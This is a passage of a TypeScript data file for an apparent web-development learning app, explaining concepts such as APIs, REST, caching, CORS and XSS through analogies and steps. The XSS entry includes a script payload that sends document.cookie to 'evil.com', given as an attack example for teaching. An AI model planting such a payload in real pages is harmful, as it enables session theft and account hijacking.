// Concept Content Data
// This file contains the detailed explanations for each concept

export interface AnalogyItem {
    emoji: string;
    title: string;
    subtitle: string;
    highlighted?: boolean;
}

export interface DiagramNode {
    emoji: string;
    title: string;
    subtitle: string;
    color: 'primary' | 'secondary' | 'accent';
}

export interface Step {
    step: string;
    title: string;
    description: string;
}

export interface ConceptContentData {
    whatItIs: string;
    analogy: {
        title: string;
        items: AnalogyItem[];
        description?: string;
    };
    diagram: DiagramNode[];
    howItWorks: Step[];
    misunderstanding: {
        wrong: string;
        correct: string;
    };
    realWorld: {
        title: string;
        description: string;
        points: string[];
    };
}


export const conceptContent: Record<string, ConceptContentData> = {
    // What is an API?
    'what-is-api': {
        whatItIs: "An <strong>API (Application Programming Interface)</strong> is a set of rules that lets different software applications talk to each other. It's like a waiter in a restaurant who takes your order to the kitchen and brings back your food.",
        analogy: {
            title: "The Restaurant Analogy",
            items: [
                { emoji: "👤", title: "You (Client)", subtitle: "Want to order food" },
                { emoji: "🍽️", title: "Waiter (API)", subtitle: "Takes order & brings food", highlighted: true },
                { emoji: "👨‍🍳", title: "Kitchen (Server)", subtitle: "Prepares the food" },
            ],
            description: "You don't go into the kitchen yourself. The waiter (API) handles communication between you and the kitchen, making sure your order is understood and your food is delivered correctly."
        },
        diagram: [
            { emoji: "📱", title: "Your App", subtitle: "Makes Request", color: "primary" },
            { emoji: "🔌", title: "API", subtitle: "Processes", color: "secondary" },
            { emoji: "🗄️", title: "Database", subtitle: "Returns Data", color: "accent" },
        ],
        howItWorks: [
            { step: "1", title: "Your app makes a request", description: "Example: 'Get me the weather for New York'" },
            { step: "2", title: "API receives and validates", description: "Checks if the request is properly formatted" },
            { step: "3", title: "API fetches the data", description: "Queries the database or external service" },
            { step: "4", title: "API formats the response", description: "Packages the data in a readable format (usually JSON)" },
            { step: "5", title: "Your app receives the data", description: "Displays 'Sunny, 75°F' to the user" },
        ],
        misunderstanding: {
            wrong: '"An API is a database" or "An API is a website"',
            correct: "An API is the <strong>messenger</strong> between applications. It's not the data itself, nor the application—it's the communication layer that allows them to work together."
        },
        realWorld: {
            title: "Real-World Example",
            description: "When you use a weather app on your phone:",
            points: [
                "Your app doesn't have all the weather data stored locally",
                "It uses a weather API (like OpenWeatherMap) to request current conditions",
                "The API fetches data from weather stations and satellites",
                "Your app receives the data and displays it beautifully",
            ]
        }
    },

    // REST APIs Explained
    'rest-apis': {
        whatItIs: "<strong>REST (Representational State Transfer)</strong> is an architectural style for building APIs. It uses standard HTTP methods (GET, POST, PUT, DELETE) to perform operations on resources, making APIs predictable and easy to use.",
        analogy: {
            title: "The Library Analogy",
            items: [
                { emoji: "📚", title: "Books (Resources)", subtitle: "Data you want to access" },
                { emoji: "📋", title: "Catalog System (REST)", subtitle: "Organized way to find books", highlighted: true },
                { emoji: "👨‍💼", title: "Librarian (Server)", subtitle: "Manages the books" },
            ],
            description: "REST is like a library's catalog system. You use standard methods (search, borrow, return) to interact with books. You don't need to know where books are stored—you just follow the system."
        },
        diagram: [
            { emoji: "🌐", title: "Client", subtitle: "HTTP Request", color: "primary" },
            { emoji: "🔄", title: "REST API", subtitle: "Routes to Resource", color: "secondary" },
            { emoji: "💾", title: "Resource", subtitle: "Returns Data", color: "accent" },
        ],
        howItWorks: [
            { step: "1", title: "Client sends HTTP request", description: "GET /users/123 - Request user data" },
            { step: "2", title: "API routes to resource", description: "Maps URL to the users resource" },
            { step: "3", title: "Server processes request", description: "Fetches user 123 from database" },
            { step: "4", title: "Returns JSON response", description: "Sends back user data in JSON format" },
        ],
        misunderstanding: {
            wrong: '"REST means using JSON" or "Any HTTP API is REST"',
            correct: "REST is an <strong>architectural style</strong> with specific constraints: stateless communication, resource-based URLs, standard HTTP methods, and uniform interfaces."
        },
        realWorld: {
            title: "Real-World Example",
            description: "A social media app using REST API:",
            points: [
                "GET /posts - Fetch all posts",
                "POST /posts - Create a new post",
                "PUT /posts/123 - Update post 123",
                "DELETE /posts/123 - Delete post 123",
            ]
        }
    },

    // Rate Limiting
    'rate-limiting': {
        whatItIs: "<strong>Rate limiting</strong> is a technique to control how many requests a user can make to your API in a given time period. It prevents abuse, protects your servers, and ensures fair usage for all users.",
        analogy: {
            title: "The Nightclub Bouncer Analogy",
            items: [
                { emoji: "🎉", title: "Nightclub (API)", subtitle: "Limited capacity" },
                { emoji: "💪", title: "Bouncer (Rate Limiter)", subtitle: "Controls entry", highlighted: true },
                { emoji: "👥", title: "People (Requests)", subtitle: "Want to get in" },
            ],
            description: "A nightclub bouncer only lets a certain number of people in at a time. If too many try to enter at once, they have to wait. Rate limiting works the same way for API requests."
        },
        diagram: [
            { emoji: "📱", title: "Client", subtitle: "Sends Requests", color: "primary" },
            { emoji: "🛡️", title: "Rate Limiter", subtitle: "Checks Limit", color: "secondary" },
            { emoji: "✅", title: "API", subtitle: "Processes or Rejects", color: "accent" },
        ],
        howItWorks: [
            { step: "1", title: "Request arrives", description: "Client sends a request to your API" },
            { step: "2", title: "Check counter", description: "Rate limiter checks how many requests from this client" },
            { step: "3", title: "Within limit?", description: "If under limit, allow. If over, reject with 429 error" },
            { step: "4", title: "Increment counter", description: "Add 1 to the client's request count" },
            { step: "5", title: "Reset after time window", description: "Counter resets after 1 minute/hour/day" },
        ],
        misunderstanding: {
            wrong: '"Rate limiting is only for preventing attacks"',
            correct: "Rate limiting serves multiple purposes: <strong>preventing abuse, ensuring fair usage, protecting infrastructure, and managing costs</strong>. It's essential for any production API."
        },
        realWorld: {
            title: "Real-World Example",
            description: "Twitter API rate limiting:",
            points: [
                "Free tier: 100 requests per 15 minutes",
                "If you exceed this, you get a 429 'Too Many Requests' error",
                "You must wait until the 15-minute window resets",
                "This prevents bots from overwhelming their servers",
            ]
        }
    },

    // Authentication vs Authorization
    'authentication-vs-authorization': {
        whatItIs: "<strong>Authentication</strong> is proving who you are (like showing your ID), while <strong>Authorization</strong> is determining what you're allowed to do (like having a VIP pass). They work together but serve different purposes.",
        analogy: {
            title: "The Airport Security Analogy",
            items: [
                { emoji: "🎫", title: "Ticket (Authentication)", subtitle: "Proves you're a passenger" },
                { emoji: "🚪", title: "Security Check", subtitle: "Verifies identity", highlighted: true },
                { emoji: "✈️", title: "Boarding Pass (Authorization)", subtitle: "Determines your seat class" },
            ],
            description: "At the airport, you show your ID to prove who you are (authentication). Then your boarding pass determines if you can access first class or economy (authorization)."
        },
        diagram: [
            { emoji: "👤", title: "User", subtitle: "Provides Credentials", color: "primary" },
            { emoji: "🔐", title: "Authentication", subtitle: "Verifies Identity", color: "secondary" },
            { emoji: "🎯", title: "Authorization", subtitle: "Grants Permissions", color: "accent" },
        ],
        howItWorks: [
            { step: "1", title: "User provides credentials", description: "Username and password submitted" },
            { step: "2", title: "Authentication verifies", description: "System checks if credentials are valid" },
            { step: "3", title: "User is authenticated", description: "System knows WHO you are" },
            { step: "4", title: "Authorization checks permissions", description: "System checks WHAT you can access" },
            { step: "5", title: "Access granted or denied", description: "Based on your role and permissions" },
        ],
        misunderstanding: {
            wrong: '"Authentication and authorization are the same thing"',
            correct: "<strong>Authentication</strong> answers 'Who are you?' while <strong>Authorization</strong> answers 'What can you do?'. You can be authenticated but not authorized for certain actions."
        },
        realWorld: {
            title: "Real-World Example",
            description: "In a company system:",
            points: [
                "Authentication: You log in with your employee ID and password",
                "Authorization: Your role (admin, manager, employee) determines access",
                "Admin can delete users, manager can approve requests, employee can only view",
                "You're authenticated as 'John', but authorized only for employee-level actions",
            ]
        }
    },

    // HTTPS Explained
    'https-explained': {
        whatItIs: "<strong>HTTPS (HTTP Secure)</strong> is the secure version of HTTP. It encrypts data between your browser and the website using SSL/TLS, preventing hackers from reading or modifying your information.",
        analogy: {
            title: "The Sealed Envelope Analogy",
            items: [
                { emoji: "📧", title: "Postcard (HTTP)", subtitle: "Anyone can read it" },
                { emoji: "🔒", title: "Sealed Envelope (HTTPS)", subtitle: "Only recipient can read", highlighted: true },
                { emoji: "📬", title: "Mailbox (Server)", subtitle: "Receives the message" },
            ],
            description: "HTTP is like sending a postcard—anyone handling it can read your message. HTTPS is like a sealed envelope—only the intended recipient can open and read it."
        },
        diagram: [
            { emoji: "🌐", title: "Browser", subtitle: "Encrypts Data", color: "primary" },
            { emoji: "🔐", title: "SSL/TLS", subtitle: "Secure Channel", color: "secondary" },
            { emoji: "🖥️", title: "Server", subtitle: "Decrypts Data", color: "accent" },
        ],
        howItWorks: [
            { step: "1", title: "Browser requests secure connection", description: "Connects to website with HTTPS" },
            { step: "2", title: "Server sends SSL certificate", description: "Proves the server's identity" },
            { step: "3", title: "Browser verifies certificate", description: "Checks if certificate is valid and trusted" },
            { step: "4", title: "Encryption keys exchanged", description: "Both sides agree on encryption method" },
            { step: "5", title: "Secure communication begins", description: "All data is encrypted end-to-end" },
        ],
        misunderstanding: {
            wrong: '"HTTPS makes my website slower" or "HTTPS is only for e-commerce"',
            correct: "HTTPS is <strong>essential for ALL websites</strong>. Modern browsers mark HTTP sites as 'Not Secure', and HTTPS has minimal performance impact while providing crucial security and SEO benefits."
        },
        realWorld: {
            title: "Real-World Example",
            description: "When you log into your bank:",
            points: [
                "HTTPS encrypts your username and password",
                "Hackers on public WiFi can't steal your credentials",
                "The padlock icon in your browser confirms the connection is secure",
                "Your bank's identity is verified by a trusted certificate authority",
            ]
        }
    },

    // Caching Strategies
    'caching-strategies': {
        whatItIs: "<strong>Caching</strong> is storing frequently accessed data in a fast-access location to avoid repeatedly fetching it from the original source. It dramatically improves performance and reduces server load.",
        analogy: {
            title: "The Grocery Shopping Analogy",
            items: [
                { emoji: "🏪", title: "Grocery Store (Database)", subtitle: "Original source" },
                { emoji: "🧊", title: "Fridge (Cache)", subtitle: "Quick access storage", highlighted: true },
                { emoji: "🍽️", title: "Kitchen (App)", subtitle: "Where you use it" },
            ],
            description: "You don't go to the grocery store every time you need milk. You store it in your fridge (cache) for quick access. Only when it runs out do you go back to the store (database)."
        },
        diagram: [
            { emoji: "📱", title: "Request", subtitle: "Needs Data", color: "primary" },
            { emoji: "⚡", title: "Cache", subtitle: "Check Cache First", color: "secondary" },
            { emoji: "🗄️", title: "Database", subtitle: "Fallback Source", color: "accent" },
        ],
        howItWorks: [
            { step: "1", title: "Request comes in", description: "App needs user profile data" },
            { step: "2", title: "Check cache first", description: "Look in Redis/memory cache" },
            { step: "3", title: "Cache hit or miss", description: "Found in cache? Return it. Not found? Continue" },
            { step: "4", title: "Fetch from database", description: "Query the original data source" },
            { step: "5", title: "Store in cache", description: "Save result in cache for next time" },
        ],
        misunderstanding: {
            wrong: '"Caching is just for big websites" or "Cache everything forever"',
            correct: "Caching benefits <strong>any application</strong>, but requires strategy: set appropriate expiration times, invalidate stale data, and cache the right things. Not all data should be cached."
        },
        realWorld: {
            title: "Real-World Example",
            description: "Netflix using caching:",
            points: [
                "Popular shows are cached on CDN servers near you",
                "Instead of fetching from main servers, you get it from nearby cache",
                "Reduces latency from 500ms to 20ms",
                "Saves bandwidth and improves user experience dramatically",
            ]
        }
    },

    // Load Balancing
    'load-balancing': {
        whatItIs: "<strong>Load balancing</strong> is distributing incoming network traffic across multiple servers to ensure no single server gets overwhelmed. It improves reliability, performance, and scalability.",
        analogy: {
            title: "The Supermarket Checkout Analogy",
            items: [
                { emoji: "🛒", title: "Customers (Requests)", subtitle: "Need to check out" },
                { emoji: "👨‍💼", title: "Manager (Load Balancer)", subtitle: "Directs to shortest line", highlighted: true },
                { emoji: "💳", title: "Cashiers (Servers)", subtitle: "Process checkouts" },
            ],
            description: "A supermarket manager directs customers to the shortest checkout line. Load balancers do the same with web requests, sending each to the least busy server."
        },
        diagram: [
            { emoji: "🌐", title: "Users", subtitle: "Send Requests", color: "primary" },
            { emoji: "⚖️", title: "Load Balancer", subtitle: "Distributes Traffic", color: "secondary" },
            { emoji: "🖥️", title: "Servers", subtitle: "Handle Requests", color: "accent" },
        ],
        howItWorks: [
            { step: "1", title: "Request arrives", description: "User visits your website" },
            { step: "2", title: "Load balancer receives", description: "Acts as single entry point" },
            { step: "3", title: "Chooses a server", description: "Uses algorithm (round-robin, least connections, etc.)" },
            { step: "4", title: "Forwards request", description: "Sends request to selected server" },
            { step: "5", title: "Returns response", description: "Server processes and returns through load balancer" },
        ],
        misunderstanding: {
            wrong: '"Load balancing is only for huge websites"',
            correct: "Load balancing is valuable for <strong>any growing application</strong>. It provides redundancy (if one server fails, others continue), enables zero-downtime deployments, and allows horizontal scaling."
        },
        realWorld: {
            title: "Real-World Example",
            description: "E-commerce site during Black Friday:",
            points: [
                "Traffic spikes from 1,000 to 100,000 users per second",
                "Load balancer distributes across 50 servers instead of 5",
                "If one server crashes, others handle its traffic automatically",
                "Users experience no downtime or slowdowns",
            ]
        }
    },

    // CDN Explained
    'cdn-explained': {
        whatItIs: "<strong>CDN (Content Delivery Network)</strong> is a network of servers distributed globally that cache and deliver your website's content from locations closest to your users, dramatically improving load times and reducing server load.",
        analogy: {
            title: "The Pizza Chain Analogy",
            items: [
                { emoji: "🏠", title: "Your House (User)", subtitle: "Wants pizza" },
                { emoji: "🍕", title: "Local Branch (CDN)", subtitle: "Nearby location", highlighted: true },
                { emoji: "🏭", title: "Main Kitchen (Origin Server)", subtitle: "Central location" },
            ],
            description: "Instead of ordering from the main kitchen across town (slow), you order from the nearest branch (fast). CDNs work the same way—serving content from the closest server to you."
        },
        diagram: [
            { emoji: "🌍", title: "User Request", subtitle: "Needs Content", color: "primary" },
            { emoji: "⚡", title: "Nearest CDN", subtitle: "Serves Cached Content", color: "secondary" },
            { emoji: "🖥️", title: "Origin Server", subtitle: "Fallback if Not Cached", color: "accent" },
        ],
        howItWorks: [
            { step: "1", title: "User requests content", description: "Browser requests image/video/file from your site" },
            { step: "2", title: "DNS routes to nearest CDN", description: "Automatically finds the closest CDN server" },
            { step: "3", title: "CDN checks cache", description: "If content is cached, serve it immediately" },
            { step: "4", title: "Fetch from origin if needed", description: "If not cached, get from origin server and cache it" },
            { step: "5", title: "Deliver to user", description: "Content served in milliseconds instead of seconds" },
        ],
        misunderstanding: {
            wrong: '"CDN is only for huge websites" or "CDN is just for images"',
            correct: "<strong>Any website benefits from CDN</strong>. It improves speed for all static content (HTML, CSS, JS, images, videos), reduces bandwidth costs, and provides DDoS protection."
        },
        realWorld: {
            title: "Real-World Example",
            description: "Netflix using CDN:",
            points: [
                "Netflix has CDN servers in 1000+ locations worldwide",
                "When you watch a show, it streams from a server near you",
                "Without CDN: 2000ms latency from US to Australia",
                "With CDN: 20ms latency from local server—100x faster!",
            ]
        }
    },

    // Reverse Proxy
    'reverse-proxy': {
        whatItIs: "<strong>Reverse proxy</strong> is a server that sits in front of your web servers and forwards client requests to them. It acts as a gateway, providing load balancing, caching, SSL termination, and security.",
        analogy: {
            title: "The Hotel Receptionist Analogy",
            items: [
                { emoji: "👤", title: "Guest (Client)", subtitle: "Wants a room" },
                { emoji: "👔", title: "Receptionist (Reverse Proxy)", subtitle: "Handles requests", highlighted: true },
                { emoji: "🏨", title: "Rooms (Servers)", subtitle: "Actual services" },
            ],
            description: "Guests don't directly access rooms—they go through the receptionist who assigns rooms, handles keys, and manages everything. Similarly, clients don't directly access your servers; the reverse proxy manages all requests."
        },
        diagram: [
            { emoji: "🌐", title: "Client", subtitle: "Sends Request", color: "primary" },
            { emoji: "🛡️", title: "Reverse Proxy", subtitle: "Nginx/HAProxy", color: "secondary" },
            { emoji: "🖥️", title: "Backend Servers", subtitle: "Process Request", color: "accent" },
        ],
        howItWorks: [
            { step: "1", title: "Client sends request", description: "User visits your website" },
            { step: "2", title: "Reverse proxy receives", description: "Nginx/HAProxy acts as single entry point" },
            { step: "3", title: "Proxy makes decisions", description: "Load balance, cache, or forward to backend" },
            { step: "4", title: "Backend processes", description: "Application server handles the request" },
            { step: "5", title: "Proxy returns response", description: "May cache response for future requests" },
        ],
        misunderstanding: {
            wrong: '"Reverse proxy and load balancer are the same"',
            correct: "A reverse proxy can do <strong>load balancing plus more</strong>: SSL termination, caching, compression, security filtering. Load balancer is just one feature of a reverse proxy."
        },
        realWorld: {
            title: "Real-World Example",
            description: "Using Nginx as reverse proxy:",
            points: [
                "Handles SSL/TLS encryption (HTTPS) for all backend servers",
                "Caches static content to reduce backend load",
                "Distributes traffic across multiple app servers",
                "Protects backend servers from direct internet exposure",
            ]
        }
    },

    // Webhooks Explained
    'webhooks': {
        whatItIs: "<strong>Webhooks</strong> are automated messages sent from one app to another when a specific event happens. Instead of constantly checking for updates (polling), the app notifies you immediately when something changes.",
        analogy: {
            title: "The Doorbell Analogy",
            items: [
                { emoji: "🏠", title: "Your House (Your App)", subtitle: "Waiting for delivery" },
                { emoji: "🔔", title: "Doorbell (Webhook)", subtitle: "Notifies you", highlighted: true },
                { emoji: "📦", title: "Delivery (Event)", subtitle: "Package arrives" },
            ],
            description: "Instead of checking your door every 5 minutes (polling), you wait for the doorbell to ring (webhook). The delivery service notifies you exactly when your package arrives."
        },
        diagram: [
            { emoji: "🎯", title: "Event Occurs", subtitle: "Payment Completed", color: "primary" },
            { emoji: "📡", title: "Webhook Fires", subtitle: "HTTP POST Request", color: "secondary" },
            { emoji: "🖥️", title: "Your Server", subtitle: "Receives Notification", color: "accent" },
        ],
        howItWorks: [
            { step: "1", title: "Register webhook URL", description: "Tell the service where to send notifications" },
            { step: "2", title: "Event happens", description: "User makes payment, creates account, etc." },
            { step: "3", title: "Service sends HTTP POST", description: "Immediately sends data to your webhook URL" },
            { step: "4", title: "Your server receives", description: "Process the event data" },
            { step: "5", title: "Respond with 200 OK", description: "Confirm you received the webhook" },
        ],
        misunderstanding: {
            wrong: '"Webhooks and APIs are the same"',
            correct: "<strong>APIs are pull (you request), webhooks are push (they notify)</strong>. APIs require you to ask for data; webhooks automatically send data when events occur."
        },
        realWorld: {
            title: "Real-World Example",
            description: "Stripe payment webhooks:",
            points: [
                "User completes payment on your site",
                "Stripe immediately sends webhook to your server",
                "Your server receives payment confirmation",
                "You can update order status, send email, etc. in real-time",
            ]
        }
    },

    // GraphQL vs REST
    'graphql-vs-rest': {
        whatItIs: "<strong>GraphQL</strong> is a query language that lets clients request exactly the data they need, while <strong>REST</strong> returns fixed data structures from predefined endpoints. GraphQL offers more flexibility; REST is simpler and more widely adopted.",
        analogy: {
            title: "The Restaurant Menu Analogy",
            items: [
                { emoji: "📋", title: "REST (Set Menu)", subtitle: "Fixed meal combos" },
                { emoji: "🎯", title: "GraphQL (À la carte)", subtitle: "Pick exactly what you want", highlighted: true },
                { emoji: "👨‍🍳", title: "Kitchen (Server)", subtitle: "Prepares your order" },
            ],
            description: "REST is like a set menu—you get combo #1, #2, or #3 with predefined items. GraphQL is à la carte—you specify exactly which items you want, nothing more, nothing less."
        },
        diagram: [
            { emoji: "📱", title: "Client", subtitle: "Needs Specific Data", color: "primary" },
            { emoji: "🔄", title: "GraphQL/REST", subtitle: "Different Approaches", color: "secondary" },
            { emoji: "💾", title: "Database", subtitle: "Returns Data", color: "accent" },
        ],
        howItWorks: [
            { step: "1", title: "REST: Multiple endpoints", description: "GET /users/1, GET /posts/1, GET /comments/1" },
            { step: "2", title: "GraphQL: Single endpoint", description: "POST /graphql with specific query" },
            { step: "3", title: "REST: Fixed response", description: "Returns all user fields even if you need only name" },
            { step: "4", title: "GraphQL: Custom response", description: "Returns only the fields you requested" },
        ],
        misunderstanding: {
            wrong: '"GraphQL is always better than REST"',
            correct: "<strong>Each has trade-offs</strong>. REST is simpler, cacheable, and widely understood. GraphQL offers flexibility but adds complexity. Choose based on your needs."
        },
        realWorld: {
            title: "Real-World Example",
            description: "Mobile app fetching user data:",
            points: [
                "REST: 3 API calls (user, posts, comments) = 3 round trips",
                "GraphQL: 1 query gets user, posts, and comments = 1 round trip",
                "REST: Over-fetching (get all fields, use only some)",
                "GraphQL: Exact data (request only name and email)",
            ]
        }
    },

    // API Authentication
    'api-authentication': {
        whatItIs: "<strong>API authentication</strong> is the process of verifying the identity of clients making API requests. Common methods include API keys, JWT tokens, and OAuth, each offering different levels of security and complexity.",
        analogy: {
            title: "The Building Access Analogy",
            items: [
                { emoji: "🔑", title: "API Key (Building Key)", subtitle: "Simple access" },
                { emoji: "🎫", title: "JWT (Temporary Badge)", subtitle: "Time-limited access", highlighted: true },
                { emoji: "🆔", title: "OAuth (ID Verification)", subtitle: "Delegated access" },
            ],
            description: "API keys are like building keys (simple but if stolen, anyone can use). JWT is like a temporary badge (expires after time). OAuth is like showing ID to get a visitor pass (secure, delegated)."
        },
        diagram: [
            { emoji: "📱", title: "Client", subtitle: "Sends Credentials", color: "primary" },
            { emoji: "🔐", title: "Auth System", subtitle: "Verifies Identity", color: "secondary" },
            { emoji: "✅", title: "API", subtitle: "Grants Access", color: "accent" },
        ],
        howItWorks: [
            { step: "1", title: "Client provides credentials", description: "API key, username/password, or OAuth token" },
            { step: "2", title: "Server validates", description: "Checks if credentials are valid and not expired" },
            { step: "3", title: "Generate token (JWT)", description: "Create signed token with user info and expiration" },
            { step: "4", title: "Client includes token", description: "Send token in Authorization header with each request" },
            { step: "5", title: "Server verifies token", description: "Validate signature and check expiration on each request" },
        ],
        misunderstanding: {
            wrong: '"API keys are secure enough for everything"',
            correct: "API keys are <strong>simple but not secure for user authentication</strong>. Use JWT for user sessions and OAuth for third-party access. API keys are best for server-to-server communication."
        },
        realWorld: {
            title: "Real-World Example",
            description: "Twitter API authentication:",
            points: [
                "You register your app and get API key + secret",
                "Users authorize your app via OAuth",
                "Twitter gives you an access token for that user",
                "You include the token in API requests to access user data",
            ]
        }
    },

    // Client-Side Rendering
    'client-side-rendering': {
        whatItIs: "<strong>Client-Side Rendering (CSR)</strong> is when JavaScript in the browser builds the HTML after the page loads. The server sends a minimal HTML file and JavaScript does all the rendering, making it great for interactive apps but slower initial load.",
        analogy: {
            title: "The IKEA Furniture Analogy",
            items: [
                { emoji: "📦", title: "Server (IKEA)", subtitle: "Sends flat-pack" },
                { emoji: "🔧", title: "JavaScript (You)", subtitle: "Assembles furniture", highlighted: true },
                { emoji: "🏠", title: "Browser (Your Home)", subtitle: "Where it's built" },
            ],
            description: "CSR is like IKEA furniture—the server sends you a flat-pack (minimal HTML + JS), and you assemble it yourself in your browser. It takes time to build, but once done, it's fully interactive."
        },
        diagram: [
            { emoji: "🌐", title: "Browser", subtitle: "Requests Page", color: "primary" },
            { emoji: "📄", title: "Server", subtitle: "Sends HTML + JS", color: "secondary" },
            { emoji: "⚙️", title: "JavaScript", subtitle: "Renders Content", color: "accent" },
        ],
        howItWorks: [
            { step: "1", title: "Browser requests page", description: "User visits your website" },
            { step: "2", title: "Server sends minimal HTML", description: "Just a shell with <div id='root'> and JS files" },
            { step: "3", title: "Browser downloads JavaScript", description: "React, Vue, or other framework code" },
            { step: "4", title: "JavaScript executes", description: "Fetches data from API and builds the UI" },
            { step: "5", title: "Page becomes interactive", description: "User can now interact with the app" },
        ],
        misunderstanding: {
            wrong: '"CSR is always slower than SSR"',
            correct: "CSR has <strong>slower initial load but faster navigation</strong>. After the first load, navigating between pages is instant because everything is already in the browser."
        },
        realWorld: {
            title: "Real-World Example",
            description: "Gmail using CSR:",
            points: [
                "Initial load takes a moment (downloading JS)",
                "Once loaded, switching between emails is instant",
                "No page refreshes when reading emails",
                "Feels like a desktop app, not a website",
            ]
        }
    },

    // Server-Side Rendering
    'server-side-rendering': {
        whatItIs: "<strong>Server-Side Rendering (SSR)</strong> is when the server generates the full HTML for each page before sending it to the browser. This provides faster initial load and better SEO, but requires more server resources.",
        analogy: {
            title: "The Restaurant Meal Analogy",
            items: [
                { emoji: "🍽️", title: "Server (Restaurant)", subtitle: "Prepares everything" },
                { emoji: "🚚", title: "Delivery (HTTP)", subtitle: "Brings ready meal", highlighted: true },
                { emoji: "🏠", title: "Browser (Your Home)", subtitle: "Just eat it" },
            ],
            description: "SSR is like restaurant delivery—the server prepares the full meal (HTML) and delivers it ready to eat. You don't need to cook (render) anything; just consume it immediately."
        },
        diagram: [
            { emoji: "🌐", title: "Browser", subtitle: "Requests Page", color: "primary" },
            { emoji: "⚙️", title: "Server", subtitle: "Renders HTML", color: "secondary" },
            { emoji: "📄", title: "Browser", subtitle: "Displays Immediately", color: "accent" },
        ],
        howItWorks: [
            { step: "1", title: "Browser requests page", description: "User visits your website" },
            { step: "2", title: "Server fetches data", description: "Queries database for content" },
            { step: "3", title: "Server renders HTML", description: "React/Vue renders on server, not browser" },
            { step: "4", title: "Send complete HTML", description: "Browser receives fully-formed page" },
            { step: "5", title: "Hydration", description: "JavaScript makes the page interactive" },
        ],
        misunderstanding: {
            wrong: '"SSR means no JavaScript in the browser"',
            correct: "SSR <strong>still uses JavaScript for interactivity</strong>. The server renders the initial HTML, then JavaScript 'hydrates' it to make it interactive. Best of both worlds."
        },
        realWorld: {
            title: "Real-World Example",
            description: "Next.js blog with SSR:",
            points: [
                "Server renders blog post HTML with content",
                "User sees content immediately (good for SEO)",
                "JavaScript loads and makes comments/likes interactive",
                "Faster perceived performance than CSR",
            ]
        }
    },

    // XSS Attacks
    'xss-attacks': {
        whatItIs: "<strong>XSS (Cross-Site Scripting)</strong> is a security vulnerability where attackers inject malicious JavaScript into your website, which then executes in other users' browsers, potentially stealing data or hijacking sessions.",
        analogy: {
            title: "The Poisoned Comment Analogy",
            items: [
                { emoji: "💬", title: "Comment Box (Input)", subtitle: "Where users type" },
                { emoji: "☠️", title: "Malicious Script (XSS)", subtitle: "Hidden poison", highlighted: true },
                { emoji: "👥", title: "Other Users (Victims)", subtitle: "Execute the script" },
            ],
            description: "Imagine a comment box where someone writes a comment with hidden poison. When others read it, they get poisoned. XSS works similarly—malicious code hidden in user input executes in other users' browsers."
        },
        diagram: [
            { emoji: "😈", title: "Attacker", subtitle: "Injects Script", color: "primary" },
            { emoji: "🗄️", title: "Database", subtitle: "Stores Malicious Code", color: "secondary" },
            { emoji: "👤", title: "Victim", subtitle: "Executes Script", color: "accent" },
        ],
        howItWorks: [
            { step: "1", title: "Attacker finds input field", description: "Comment box, profile name, search bar, etc." },
            { step: "2", title: "Inject malicious script", description: "<script>steal_cookies()</script>" },
            { step: "3", title: "Script stored in database", description: "Your app saves it without sanitizing" },
            { step: "4", title: "Victim views the page", description: "Browser renders the malicious script" },
            { step: "5", title: "Script executes", description: "Steals cookies, redirects, or performs actions as the user" },
        ],
        misunderstanding: {
            wrong: '"XSS only affects old websites"',
            correct: "<strong>XSS is still one of the top web vulnerabilities</strong>. Even modern frameworks can be vulnerable if you use dangerouslySetInnerHTML or disable sanitization."
        },
        realWorld: {
            title: "Real-World Example",
            description: "XSS attack on a forum:",
            points: [
                "Attacker posts: <script>document.location='evil.com?cookie='+document.cookie</script>",
                "Forum stores this in database without escaping",
                "When users view the post, script executes",
                "Their session cookies are sent to attacker's server",
            ]
        }
    },

    // CORS Explained
    'cors-explained': {
        whatItIs: "<strong>CORS (Cross-Origin Resource Sharing)</strong> is a security feature that controls which websites can access your API. Browsers block requests from different domains by default; CORS headers tell the browser which cross-origin requests to allow.",
        analogy: {
            title: "The Gated Community Analogy",
            items: [
                { emoji: "🏘️", title: "Your API (Community)", subtitle: "Protected resource" },
                { emoji: "🚧", title: "CORS (Gate)", subtitle: "Controls access", highlighted: true },
                { emoji: "🚗", title: "Other Websites (Visitors)", subtitle: "Want to enter" },
            ],
            description: "Your API is like a gated community. By default, the gate (CORS) blocks all visitors from other neighborhoods (domains). You configure CORS to allow specific visitors or everyone."
        },
        diagram: [
            { emoji: "🌐", title: "Website A", subtitle: "Makes Request", color: "primary" },
            { emoji: "🛡️", title: "Browser", subtitle: "Checks CORS", color: "secondary" },
            { emoji: "🖥️", title: "API (Website B)", subtitle: "Allows or Blocks", color: "accent" },
        ],
        howItWorks: [
            { step: "1", title: "Browser makes request", description: "example.com tries to call api.other.com" },
            { step: "2", title: "Browser checks origin", description: "Sees request is cross-origin (different domain)" },
            { step: "3", title: "Preflight request (OPTIONS)", description: "Browser asks: 'Is this allowed?'" },
            { step: "4", title: "Server responds with CORS headers", description: "Access-Control-Allow-Origin: example.com" },
            { step: "5", title: "Browser allows or blocks", description: "If origin is allowed, request proceeds" },
        ],
        misunderstanding: {
            wrong: '"CORS is an API security feature"',
            correct: "CORS is a <strong>browser security feature</strong>. It only affects browser requests. Tools like Postman or curl bypass CORS because they're not browsers."
        },
        realWorld: {
            title: "Real-World Example",
            description: "Frontend calling backend API:",
            points: [
                "Frontend: https://myapp.com",
                "API: https://api.myapp.com (different subdomain = cross-origin)",
                "Without CORS: Browser blocks the request",
                "With CORS header: Access-Control-Allow-Origin: https://myapp.com → Allowed",
            ]
        }
    },

    // Docker Containers
    'docker-containers': {
        whatItIs: "<strong>Docker containers</strong> are lightweight, portable packages that include your application and all its dependencies. They ensure your app runs the same way everywhere—on your laptop, staging, and production.",
        analogy: {
            title: "The Shipping Container Analogy",
            items: [
                { emoji: "📦", title: "Container (Docker)", subtitle: "Standardized package" },
                { emoji: "🚢", title: "Ship (Server)", subtitle: "Runs containers", highlighted: true },
                { emoji: "🏗️", title: "Cargo (Your App)", subtitle: "What's inside" },
            ],
            description: "Shipping containers revolutionized logistics by standardizing how goods are transported. Docker does the same for software—your app is packaged in a standard container that runs anywhere."
        },
        diagram: [
            { emoji: "💻", title: "Your Code", subtitle: "Application", color: "primary" },
            { emoji: "📦", title: "Docker Image", subtitle: "Packaged with Dependencies", color: "secondary" },
            { emoji: "🚀", title: "Container", subtitle: "Running Instance", color: "accent" },
        ],
        howItWorks: [
            { step: "1", title: "Write Dockerfile", description: "Define your app's environment and dependencies" },
            { step: "2", title: "Build image", description: "docker build creates a snapshot of your app" },
            { step: "3", title: "Push to registry", description: "Upload to Docker Hub or private registry" },
